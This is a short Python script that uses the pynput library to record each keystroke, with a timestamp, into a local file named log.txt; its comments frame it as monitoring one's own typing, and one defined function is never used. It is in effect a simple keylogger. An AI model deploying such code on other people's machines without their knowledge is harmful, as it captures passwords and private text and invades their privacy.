from pynput.keyboard import Key, Listener
import logging

# Configure the log format to include a time and date stamp first
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# add logging for mouse movements also to see what I'm pressing around that time

# Convert the key name into a string
def on_press(key):
    logging.info(str(key))

def key_up(key):
    on_press(key)

# Setup to run the on_press function when a keyboard key is pressed
with Listener(on_press=on_press) as listener :
    listener.join()